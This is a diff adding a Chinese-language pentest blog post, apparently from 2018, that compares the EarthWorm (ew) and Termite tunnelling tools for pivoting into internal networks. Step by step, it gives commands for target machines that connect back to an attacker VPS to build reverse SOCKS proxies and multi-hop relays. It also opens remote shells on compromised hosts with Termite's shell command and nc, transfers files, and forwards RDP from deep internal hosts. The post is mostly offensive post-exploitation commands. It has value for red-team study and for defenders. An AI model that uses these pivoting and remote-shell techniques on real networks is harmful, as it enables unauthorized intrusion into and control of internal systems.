@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>Termite代理工具</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/termite.html" rel="bookmark"
+           title="Permalink to Termite代理工具">Termite代理工具</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2018-02-03T00:00:00+01:00">
+                <a href='#'>02/03/2018 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的</p>
+<p>正向socks v5服务器</p>
+<p><a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a>
+以上面这个文章作为例子，来说下对应的转发与代理</p>
+<p>如果目标有一个外网IP：</p>
+<p>ew来说建立socks代理服务：</p>
+<p><code>ew -s ssocksd -l 8888</code></p>
+<p>Termite:</p>
+<div class="highlight"><pre><span></span><span class="n">agent_exe</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="mi">8888</span><span class="w"></span>
+<span class="n">admin_exe</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">[</span><span class="n">tartet_ip</span><span class="o">]</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">8888</span><span class="w"></span>
+<span class="n">然后在admin_exe里面有一个操作界面</span><span class="err">，</span><span class="n">可以使用show看下当前节点分布</span><span class="err">，</span><span class="n">然后如下操作</span><span class="err">：</span><span class="w"></span>
+<span class="k">goto</span><span class="w"> </span><span class="nl">1</span><span class="w"></span>
+<span class="n">socks</span><span class="w"> </span><span class="mi">1080</span><span class="w"></span>
+<span class="n">此时VPS上面的1080就架设了一个服务器</span><span class="err">。</span><span class="w"></span>
+</pre></div>
+
+
+<h2>反弹socks服务器</h2>
+<p>假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：</p>
+<div class="highlight"><pre><span></span><span class="n">VPS</span><span class="err">：</span> <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rcsocks</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">e</span> <span class="mi">888</span>
+<span class="n">Target</span><span class="p">:</span> <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rssocks</span> <span class="o">-</span><span class="n">d</span> <span class="mi">139</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="mi">113</span> <span class="o">-</span><span class="n">e</span> <span class="mi">888</span>
+<span class="err">此时就可以以</span><span class="n">vps上面1080端口作为代理进入内网</span>
+</pre></div>
+
+
+<p>Termite:</p>
+<div class="highlight"><pre><span></span><span class="n">VPS</span><span class="p">:</span>  <span class="p">.</span><span class="o">/</span><span class="n">agent_exe</span> <span class="o">-</span><span class="n">l</span> <span class="mi">888</span>
+<span class="n">Target</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">agent_exe</span> <span class="o">-</span><span class="k">c</span> <span class="p">[</span><span class="mi">139</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="mi">113</span><span class="p">]</span> <span class="o">-</span><span class="n">p</span> <span class="mi">888</span>
+<span class="n">VPS</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">admin_exe</span> <span class="o">-</span><span class="k">c</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span><span class="n">p</span> <span class="mi">888</span>
+<span class="err">此时获取一个</span><span class="n">admin的终端</span><span class="err">，然后查看节点，</span><span class="n">target会变成2节点</span><span class="err">，</span>
+<span class="k">goto</span> <span class="mi">2</span>
+<span class="n">socks</span> <span class="mi">1080</span>  <span class="o">//</span><span class="err">现在可以以</span><span class="n">vps上面1080作为代理进入目标内网</span>
+<span class="n">shell</span> <span class="mi">6666</span>  <span class="o">//</span><span class="err">在</span><span class="n">vps上面直接nc</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="mi">6666</span><span class="err">可以获取目标主机的</span><span class="n">shell</span>
+<span class="n">downfile和upfile</span>  <span class="o">//</span><span class="err">可以直接下载上传文件</span>
+</pre></div>
+
+
+<h3>二级网络环境(一)</h3>
+<p><a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a> </p>
+<p>这个环境稍微复杂一点，大家可以看着图</p>
+<div class="highlight"><pre><span></span><span class="err">分为</span><span class="mi">4</span><span class="err">个步骤：</span>
+
+<span class="n">VPS</span><span class="p">:</span> <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_listen</span> <span class="o">-</span><span class="n">l</span> <span class="mi">10800</span> <span class="o">-</span><span class="n">e</span> <span class="mi">888</span>  <span class="o">//</span><span class="err">在</span><span class="n">vps上面添加转接隧道</span><span class="err">，把</span><span class="mi">10800</span><span class="err">端口收到的代理请求转发给</span><span class="mi">888</span>
+
+<span class="n">B</span><span class="p">:</span> <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">ssocksd</span> <span class="o">-</span><span class="n">l</span> <span class="mi">999</span>   <span class="o">//</span><span class="n">B主机启动socks代理</span><span class="err">，端口</span><span class="mi">999</span>
+
+<span class="n">A</span><span class="p">:</span> <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_slave</span> <span class="o">-</span><span class="n">d</span> <span class="mi">139</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="mi">113</span> <span class="o">-</span><span class="n">e</span> <span class="mi">888</span> <span class="o">-</span><span class="n">f</span> <span class="mi">10</span><span class="p">.</span><span class="mi">48</span><span class="p">.</span><span class="mi">128</span><span class="p">.</span><span class="mi">49</span> <span class="o">-</span><span class="k">g</span> <span class="mi">999</span> <span class="o">//</span><span class="err">在</span><span class="n">A主机上面使用lcx_slave的方式</span><span class="err">，把公网的</span><span class="mi">888</span><span class="err">端口和</span><span class="n">B主机的999端口连接起来</span>
+
+<span class="err">现在可以通过</span><span class="n">vps的10800来使用B主机架设的socks5代理</span>
+</pre></div>
+
+
+<p>Termite是这样:</p>
+<div class="highlight"><pre><span></span><span class="n">VPS</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">agent_exe</span> <span class="o">-</span><span class="n">l</span> <span class="mi">888</span>
+<span class="n">A主机</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">agent_exe</span> <span class="o">-</span><span class="k">c</span> <span class="p">[</span><span class="mi">139</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="mi">113</span><span class="p">]</span> <span class="o">-</span><span class="n">p</span> <span class="mi">888</span>
+<span class="n">VPS</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">admin_exe</span> <span class="o">-</span><span class="k">c</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span><span class="n">p</span> <span class="mi">888</span>
+<span class="k">goto</span> <span class="mi">2</span>
+<span class="k">listen</span> <span class="mi">999</span>
+<span class="n">B主机</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">agent_exe</span> <span class="o">-</span><span class="k">c</span> <span class="mi">10</span><span class="p">.</span><span class="mi">48</span><span class="p">.</span><span class="mi">128</span><span class="p">.</span><span class="mi">49</span> <span class="o">-</span><span class="n">p</span> <span class="mi">999</span>
+<span class="err">此时</span><span class="n">B主机节点是3</span>
+<span class="k">goto</span> <span class="mi">3</span> 
+<span class="n">socks</span> <span class="mi">10800</span>
+
+<span class="err">此时就可以以</span><span class="n">VPS上面的10800作为socks代理</span><span class="err">，进入</span><span class="n">B的内网</span><span class="err">。</span>
+</pre></div>
+
+
+<p>从上面的操作可以看出来Termite只要把agent节点互相连接起来，就可以在admin里面跳来跳去，跳到哪里就可以以那个节点作为socks代理，或者端口转发，或者把那个节点开一个shell。</p>
+<p>比如上面在B主机开一个shell:</p>
+<div class="highlight"><pre><span></span><span class="k">goto</span> <span class="mi">3</span>
+<span class="n">shell</span> <span class="mi">7777</span>
+<span class="err">然后在</span><span class="n">vps上面</span> <span class="n">nc</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="mi">7777</span><span class="err">就获得</span><span class="n">B主机的shell</span>
+</pre></div>
+
+
+<p>一句话: 只要agent节点之间互联，admin就可以随便跳</p>
+<h3>三级网络环境:</h3>
+<p>ew是这样操作的:</p>
+<div class="highlight"><pre><span></span><span class="n">VPS</span><span class="o">:</span> <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rcsoskc</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">e</span> <span class="mi">888</span>
+<span class="n">A</span><span class="o">:</span> <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_slave</span> <span class="o">-</span><span class="n">d</span> <span class="mi">139</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="mi">113</span> <span class="o">-</span><span class="n">e</span> <span class="mi">888</span> <span class="o">-</span><span class="n">f</span> <span class="mf">10.48</span><span class="o">.</span><span class="mf">128.12</span> <span class="o">-</span><span class="n">g</span> <span class="mi">999</span>
+<span class="n">B</span><span class="o">:</span> <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_listen</span> <span class="o">-</span><span class="n">l</span> <span class="mi">999</span> <span class="o">-</span><span class="n">e</span> <span class="mi">777</span>
+<span class="n">C</span><span class="o">:</span> <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rssocks</span> <span class="o">-</span><span class="n">d</span> <span class="mf">10.48</span><span class="o">.</span><span class="mf">128.12</span> <span class="o">-</span><span class="n">e</span> <span class="mi">777</span>
+
+<span class="err">此时就可以通过</span><span class="n">VPS上面的139</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="mi">113</span><span class="err">的</span><span class="mi">1080</span><span class="err">端口来使用在</span><span class="n">C主机架设的socks5代理</span>
+</pre></div>
+
+
+<p>Termite:</p>
+<div class="highlight"><pre><span></span><span class="nv">VPS</span>: .<span class="o">/</span><span class="nv">agent_exe</span> <span class="o">-</span><span class="nv">l</span> <span class="mi">888</span>
+<span class="nv">A</span>主机: .<span class="o">/</span><span class="nv">agent_exe</span> <span class="o">-</span><span class="nv">c</span> [<span class="mi">139</span>.<span class="nv">x</span>.<span class="nv">x</span>.<span class="mi">113</span>] <span class="o">-</span><span class="nv">p</span> <span class="mi">888</span>
+<span class="nv">VPS</span>: .<span class="o">/</span><span class="nv">admin_exe</span> <span class="o">-</span><span class="nv">c</span> <span class="mi">127</span>.<span class="mi">0</span>.<span class="mi">0</span>.<span class="mi">1</span> <span class="o">-</span><span class="nv">p</span> <span class="mi">888</span>
+<span class="nv">B</span>: .<span class="o">/</span><span class="nv">agent_exe</span> <span class="o">-</span><span class="nv">l</span> <span class="mi">999</span>  <span class="o">//</span><span class="nv">B</span>主机开启一个监听
+<span class="k">goto</span> <span class="nl">2</span> <span class="o">//</span>跳转到<span class="nv">A</span>节点
+<span class="k">connect</span> <span class="mi">10</span>.<span class="mi">48</span>.<span class="mi">128</span>.<span class="mi">12</span>  <span class="mi">999</span> <span class="o">//</span>连接到<span class="nv">B</span>主机
+
+<span class="nv">C</span>: .<span class="o">/</span><span class="nv">agent_exe</span> <span class="o">-</span><span class="nv">l</span> <span class="mi">777</span>
+<span class="k">goto</span> <span class="nl">3</span>  <span class="o">//</span>跳转到<span class="nv">B</span>主机节点
+<span class="k">connect</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">0</span>.<span class="mi">10</span> <span class="mi">777</span>  <span class="o">//</span>在<span class="nv">B</span>节点连接<span class="nv">C</span>主机
+
+或者在<span class="nv">C</span>节点直接连接<span class="nv">B</span>:
+
+<span class="k">goto</span> <span class="nl">3</span> <span class="o">//</span>跳到<span class="nv">B</span>
+<span class="nv">listen</span> <span class="mi">666</span>
+<span class="nv">C</span>: .<span class="o">/</span><span class="nv">agent_exe</span> <span class="o">-</span><span class="nv">c</span> <span class="mi">10</span>.<span class="mi">48</span>.<span class="mi">128</span>.<span class="mi">12</span> <span class="mi">666</span>
+</pre></div>
+
+
+<p>上面的连接方式可能会存在错误的地方，请指正 ＝。＝  另外各位大佬在使用过程中有啥问题，也丢出来一起讨论下呗</p>
+<p>注意的点：</p>
+<ul>
+<li>shell指令在使用nc连接过去之后，如果10s内没操作会自动断开，这个作者在视频里说过了，大家如果有需求可以发邮件给作者</li>
+<li>lcxtran这个忘了说了，这个跟上面指令差不多，是一个端口转发。比如在B节点lcxtran 10000 C的IP 3389，此时连接vps上面的10000就可以连接C的3389啦</li>
+</ul>
+<p>参考资料:</p>
+<ul>
+<li><a href="http://rootkiter.com/Termite/README.txt">http://rootkiter.com/Termite/README.txt</a></li>
+<li><a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></li>
+</ul>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
